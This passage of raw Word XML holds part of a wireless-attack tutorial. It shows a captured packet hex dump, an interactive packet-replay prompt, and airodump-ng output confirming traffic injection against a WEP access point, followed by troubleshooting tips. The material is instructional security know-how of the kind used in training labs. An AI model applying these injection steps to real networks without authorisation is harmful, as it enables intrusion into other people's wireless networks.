          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  FF:FF:FF:FF:FF:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1AF51A60"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Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:09:5B:EC:EE:F2</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="480186A1"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D969957"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0x0000:  0841 0201 0014 6c7e 4080 0009 5bec eef2  .A</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>....l</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>~@...[...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15858A0E"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0x0010:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8001 8f00 0000 7af3 8be4  ............z...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0E00D8"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0x0020:  c587 b696 9bf0 c30d 9cd9 c871 0f5a 38c5  ...........</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>q.Z8</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17433C6E"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0x0030:  f286 fdb3 55ee 113e da14 fb19 17cc </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>0b5e  ....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>U..&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.......</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>^</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09721943"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0x0040:  6ada 92f2                                j...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793FD5E2"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20FD484C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="2FCB5591" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D7BBE" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="269E59DE"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Enter “y” to use this packet. The system responds by showing how many packets it is injecting and reminds you to start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> if it has not already been started:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23EA6A59" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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Saving chosen packet in replay_src-0204-104917.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FEA3DB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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You should also start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> to capture replies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DE10C5C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA3EC61" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>End of file.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="04B01F9B"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While this command is successfully running, the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> screen will look similar to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B93308" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00415848" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>CH  9</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> ][ Elapsed: 16 s ][ 2007-02-04 11:04 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E79CD0" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00415848" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A77A869" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00415848" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  BSSID              PWR </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>RXQ  Beacons</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B849D9C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00415848" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399F3EDE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00415848" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  00:14:6C</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   47 100      179     2689  336   9  11  WEP  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>WEP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         BSIDES                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3B9248" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00415848" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6167A082" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00415848" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  BSSID              STATION            </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>PWR  Lost</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Packets  Probes                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F857896" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00415848" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                               </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6FF8C6" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00415848" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  00:14:6C</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00415848">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  00:09:5B:EC:EE:F2   29     0     2707                                                     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A77515" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B438676"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You will notice that only one access point is being display since we included an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> filter to limit the capture to a single BSSID. Also notice that the station packets are roughly equal to the BSSID data packets. This means injection is working well. Also notice the data rate of 336 packets per </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>second which</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is also an indicator that the injection is working well. This is a pretty “ideal” injection scenario.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="488A42EB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Troubleshooting Tips</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B361A58" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="006848FE" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>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If the BSSID data packets are not increasing, make sure you are still associated with the access point. To do this, follow the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> instructions in step 2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="659D8E2A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:hanging="720"/>
        <w:rPr>
